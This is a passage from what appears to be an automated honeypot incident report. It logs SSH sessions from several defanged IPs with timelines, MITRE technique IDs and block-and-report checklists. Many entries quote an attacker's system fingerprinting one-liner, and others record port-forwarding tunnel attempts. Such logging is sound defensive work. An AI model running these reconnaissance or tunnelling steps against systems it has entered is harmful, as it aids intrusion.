| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 08:42:39` | `cowrie.session.connect` |
| `2026-09-05 08:42:45` | `cowrie.client.version` |
| `2026-09-05 08:42:45` | `cowrie.client.kex` |
| `2026-09-05 08:42:53` | `cowrie.login.success` |
| `2026-09-05 08:42:54` | `cowrie.session.params` |
| `2026-09-05 08:42:54` | `cowrie.command.input` |
| `2026-09-05 08:42:54` | `cowrie.command.input` |
| `2026-09-05 08:42:54` | `cowrie.command.input` |
| `2026-09-05 08:42:54` | `cowrie.command.input` |
| `2026-09-05 08:42:54` | `cowrie.command.input` |
| `2026-09-05 08:42:54` | `cowrie.command.success` |
| `2026-09-05 08:42:54` | `cowrie.command.input` |
| `2026-09-05 08:42:54` | `cowrie.command.input` |
| `2026-09-05 08:42:54` | `cowrie.command.input` |
| `2026-09-05 08:42:54` | `cowrie.command.input` |
| `2026-09-05 08:42:55` | `cowrie.log.closed` |
| `2026-09-05 08:42:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fa8482d9e63

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 08:44 |
| **Last Seen** | 2026-09-05 08:44 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 08:44:41` | `cowrie.session.connect` |
| `2026-09-05 08:44:41` | `cowrie.client.version` |
| `2026-09-05 08:44:41` | `cowrie.client.kex` |
| `2026-09-05 08:44:43` | `cowrie.login.success` |
| `2026-09-05 08:44:45` | `cowrie.session.params` |
| `2026-09-05 08:44:45` | `cowrie.command.input` |
| `2026-09-05 08:44:45` | `cowrie.command.input` |
| `2026-09-05 08:44:45` | `cowrie.command.input` |
| `2026-09-05 08:44:45` | `cowrie.command.input` |
| `2026-09-05 08:44:45` | `cowrie.command.input` |
| `2026-09-05 08:44:45` | `cowrie.command.success` |
| `2026-09-05 08:44:45` | `cowrie.command.input` |
| `2026-09-05 08:44:45` | `cowrie.command.input` |
| `2026-09-05 08:44:45` | `cowrie.command.input` |
| `2026-09-05 08:44:45` | `cowrie.command.input` |
| `2026-09-05 08:44:46` | `cowrie.log.closed` |
| `2026-09-05 08:44:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcf7420e3a70

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 08:46 |
| **Last Seen** | 2026-09-05 08:46 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 08:46:35` | `cowrie.session.connect` |
| `2026-09-05 08:46:35` | `cowrie.client.version` |
| `2026-09-05 08:46:35` | `cowrie.client.kex` |
| `2026-09-05 08:46:38` | `cowrie.login.success` |
| `2026-09-05 08:46:39` | `cowrie.session.params` |
| `2026-09-05 08:46:39` | `cowrie.command.input` |
| `2026-09-05 08:46:39` | `cowrie.command.input` |
| `2026-09-05 08:46:39` | `cowrie.command.input` |
| `2026-09-05 08:46:39` | `cowrie.command.input` |
| `2026-09-05 08:46:39` | `cowrie.command.input` |
| `2026-09-05 08:46:39` | `cowrie.command.success` |
| `2026-09-05 08:46:39` | `cowrie.command.input` |
| `2026-09-05 08:46:39` | `cowrie.command.input` |
| `2026-09-05 08:46:39` | `cowrie.command.input` |
| `2026-09-05 08:46:39` | `cowrie.command.input` |
| `2026-09-05 08:46:40` | `cowrie.log.closed` |
| `2026-09-05 08:46:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ab47d4924ef

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-05 08:48 |
| **Last Seen** | 2026-09-05 08:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 08:48:07` | `cowrie.session.connect` |
| `2026-09-05 08:48:07` | `cowrie.client.version` |
| `2026-09-05 08:48:07` | `cowrie.client.kex` |
| `2026-09-05 08:48:08` | `cowrie.login.success` |
| `2026-09-05 08:48:08` | `cowrie.direct-tcpip.request` |
| `2026-09-05 08:48:08` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-05 08:48:08` | `cowrie.direct-tcpip.data` |
| `2026-09-05 08:48:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab8ef969ddd9

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 08:48 |
| **Last Seen** | 2026-09-05 08:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 08:48:37` | `cowrie.session.connect` |
| `2026-09-05 08:48:38` | `cowrie.client.version` |
| `2026-09-05 08:48:38` | `cowrie.client.kex` |
| `2026-09-05 08:48:39` | `cowrie.login.success` |
| `2026-09-05 08:48:41` | `cowrie.session.params` |
| `2026-09-05 08:48:41` | `cowrie.command.input` |
| `2026-09-05 08:48:41` | `cowrie.command.input` |
| `2026-09-05 08:48:41` | `cowrie.command.input` |
| `2026-09-05 08:48:41` | `cowrie.command.input` |
| `2026-09-05 08:48:41` | `cowrie.command.input` |
| `2026-09-05 08:48:41` | `cowrie.command.success` |
| `2026-09-05 08:48:41` | `cowrie.command.input` |
| `2026-09-05 08:48:41` | `cowrie.command.input` |
| `2026-09-05 08:48:41` | `cowrie.command.input` |
| `2026-09-05 08:48:41` | `cowrie.command.input` |
| `2026-09-05 08:48:42` | `cowrie.log.closed` |
| `2026-09-05 08:48:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1ccafb36d2d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-05 08:59 |
| **Last Seen** | 2026-09-05 08:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 08:59:10` | `cowrie.session.connect` |
| `2026-09-05 08:59:10` | `cowrie.client.version` |
| `2026-09-05 08:59:10` | `cowrie.client.kex` |
| `2026-09-05 08:59:11` | `cowrie.login.success` |
| `2026-09-05 08:59:11` | `cowrie.direct-tcpip.request` |
| `2026-09-05 08:59:11` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-05 08:59:11` | `cowrie.direct-tcpip.data` |
| `2026-09-05 08:59:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09e9ec6aab5e

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-05 09:06 |
| **Last Seen** | 2026-09-05 09:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 09:06:48` | `cowrie.session.connect` |
| `2026-09-05 09:06:48` | `cowrie.client.version` |
| `2026-09-05 09:06:48` | `cowrie.client.kex` |
| `2026-09-05 09:06:48` | `cowrie.login.success` |
| `2026-09-05 09:06:48` | `cowrie.direct-tcpip.request` |
| `2026-09-05 09:06:48` | `cowrie.direct-tcpip.data` |
| `2026-09-05 09:06:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4116c5666f1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-05 09:10 |
| **Last Seen** | 2026-09-05 09:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 09:10:18` | `cowrie.session.connect` |
| `2026-09-05 09:10:18` | `cowrie.client.version` |
| `2026-09-05 09:10:18` | `cowrie.client.kex` |
| `2026-09-05 09:10:19` | `cowrie.login.success` |
| `2026-09-05 09:10:19` | `cowrie.direct-tcpip.request` |
| `2026-09-05 09:10:19` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-05 09:10:19` | `cowrie.direct-tcpip.data` |
| `2026-09-05 09:10:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-803bfa1d1ce5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-09-05 09:13 |
| **Last Seen** | 2026-09-05 09:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 09:13:54` | `cowrie.session.connect` |
| `2026-09-05 09:13:54` | `cowrie.client.version` |
| `2026-09-05 09:13:54` | `cowrie.client.kex` |
| `2026-09-05 09:13:58` | `cowrie.login.success` |
| `2026-09-05 09:14:01` | `cowrie.session.params` |
| `2026-09-05 09:14:01` | `cowrie.command.input` |
| `2026-09-05 09:14:01` | `cowrie.command.input` |
| `2026-09-05 09:14:01` | `cowrie.command.input` |
| `2026-09-05 09:14:01` | `cowrie.command.input` |
| `2026-09-05 09:14:01` | `cowrie.command.input` |
| `2026-09-05 09:14:01` | `cowrie.command.success` |
| `2026-09-05 09:14:01` | `cowrie.command.input` |
| `2026-09-05 09:14:01` | `cowrie.command.input` |
| `2026-09-05 09:14:01` | `cowrie.command.input` |
| `2026-09-05 09:14:01` | `cowrie.command.input` |
| `2026-09-05 09:14:01` | `cowrie.log.closed` |
| `2026-09-05 09:14:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aeaa01335c3a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-09-05 09:15 |
| **Last Seen** | 2026-09-05 09:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 09:15:15` | `cowrie.session.connect` |
| `2026-09-05 09:15:16` | `cowrie.client.version` |
| `2026-09-05 09:15:16` | `cowrie.client.kex` |
| `2026-09-05 09:15:20` | `cowrie.login.success` |
| `2026-09-05 09:15:22` | `cowrie.session.params` |
| `2026-09-05 09:15:22` | `cowrie.command.input` |
| `2026-09-05 09:15:22` | `cowrie.command.input` |
| `2026-09-05 09:15:22` | `cowrie.command.input` |
| `2026-09-05 09:15:22` | `cowrie.command.input` |
| `2026-09-05 09:15:22` | `cowrie.command.input` |
| `2026-09-05 09:15:22` | `cowrie.command.success` |
| `2026-09-05 09:15:22` | `cowrie.command.input` |
| `2026-09-05 09:15:22` | `cowrie.command.input` |
| `2026-09-05 09:15:22` | `cowrie.command.input` |
| `2026-09-05 09:15:22` | `cowrie.command.input` |
| `2026-09-05 09:15:23` | `cowrie.log.closed` |
| `2026-09-05 09:15:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a27bdffe99da

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-09-05 09:16 |
| **Last Seen** | 2026-09-05 09:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 09:16:41` | `cowrie.session.connect` |
| `2026-09-05 09:16:42` | `cowrie.client.version` |
| `2026-09-05 09:16:42` | `cowrie.client.kex` |
| `2026-09-05 09:16:45` | `cowrie.login.success` |
| `2026-09-05 09:16:47` | `cowrie.session.params` |
| `2026-09-05 09:16:47` | `cowrie.command.input` |
| `2026-09-05 09:16:47` | `cowrie.command.input` |
| `2026-09-05 09:16:47` | `cowrie.command.input` |
| `2026-09-05 09:16:47` | `cowrie.command.input` |
| `2026-09-05 09:16:47` | `cowrie.command.input` |
| `2026-09-05 09:16:47` | `cowrie.command.success` |
| `2026-09-05 09:16:47` | `cowrie.command.input` |
| `2026-09-05 09:16:47` | `cowrie.command.input` |
| `2026-09-05 09:16:47` | `cowrie.command.input` |
| `2026-09-05 09:16:47` | `cowrie.command.input` |
| `2026-09-05 09:16:48` | `cowrie.log.closed` |
| `2026-09-05 09:16:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b9cd2f408d4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-09-05 09:18 |
| **Last Seen** | 2026-09-05 09:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 09:18:06` | `cowrie.session.connect` |
| `2026-09-05 09:18:07` | `cowrie.client.version` |
| `2026-09-05 09:18:07` | `cowrie.client.kex` |
| `2026-09-05 09:18:10` | `cowrie.login.success` |
| `2026-09-05 09:18:12` | `cowrie.session.params` |
| `2026-09-05 09:18:12` | `cowrie.command.input` |
| `2026-09-05 09:18:12` | `cowrie.command.input` |
| `2026-09-05 09:18:12` | `cowrie.command.input` |
| `2026-09-05 09:18:12` | `cowrie.command.input` |
| `2026-09-05 09:18:12` | `cowrie.command.input` |
| `2026-09-05 09:18:12` | `cowrie.command.success` |
| `2026-09-05 09:18:12` | `cowrie.command.input` |
| `2026-09-05 09:18:12` | `cowrie.command.input` |
| `2026-09-05 09:18:12` | `cowrie.command.input` |
| `2026-09-05 09:18:12` | `cowrie.command.input` |
| `2026-09-05 09:18:13` | `cowrie.log.closed` |
| `2026-09-05 09:18:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78fb25fd7858

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-09-05 09:19 |
| **Last Seen** | 2026-09-05 09:19 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 09:19:32` | `cowrie.session.connect` |
| `2026-09-05 09:19:33` | `cowrie.client.version` |
| `2026-09-05 09:19:33` | `cowrie.client.kex` |
| `2026-09-05 09:19:38` | `cowrie.login.success` |
| `2026-09-05 09:19:41` | `cowrie.session.params` |
| `2026-09-05 09:19:41` | `cowrie.command.input` |
| `2026-09-05 09:19:41` | `cowrie.command.input` |
| `2026-09-05 09:19:41` | `cowrie.command.input` |
| `2026-09-05 09:19:41` | `cowrie.command.input` |
| `2026-09-05 09:19:41` | `cowrie.command.input` |
| `2026-09-05 09:19:41` | `cowrie.command.success` |
| `2026-09-05 09:19:41` | `cowrie.command.input` |
| `2026-09-05 09:19:41` | `cowrie.command.input` |
| `2026-09-05 09:19:41` | `cowrie.command.input` |
| `2026-09-05 09:19:41` | `cowrie.command.input` |
| `2026-09-05 09:19:42` | `cowrie.log.closed` |
| `2026-09-05 09:19:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57f7daef690c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-09-05 09:20 |
| **Last Seen** | 2026-09-05 09:21 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 09:20:59` | `cowrie.session.connect` |
| `2026-09-05 09:21:00` | `cowrie.client.version` |
| `2026-09-05 09:21:00` | `cowrie.client.kex` |
| `2026-09-05 09:21:06` | `cowrie.login.success` |
| `2026-09-05 09:21:09` | `cowrie.session.params` |
| `2026-09-05 09:21:09` | `cowrie.command.input` |
| `2026-09-05 09:21:09` | `cowrie.command.input` |
| `2026-09-05 09:21:09` | `cowrie.command.input` |
| `2026-09-05 09:21:09` | `cowrie.command.input` |
| `2026-09-05 09:21:09` | `cowrie.command.input` |
| `2026-09-05 09:21:09` | `cowrie.command.success` |
| `2026-09-05 09:21:09` | `cowrie.command.input` |
| `2026-09-05 09:21:09` | `cowrie.command.input` |
| `2026-09-05 09:21:09` | `cowrie.command.input` |
| `2026-09-05 09:21:09` | `cowrie.command.input` |
| `2026-09-05 09:21:11` | `cowrie.log.closed` |
| `2026-09-05 09:21:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-490d2529eca5

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-05 09:21 |
| **Last Seen** | 2026-09-05 09:21 |
| **Session Duration** | 1s |
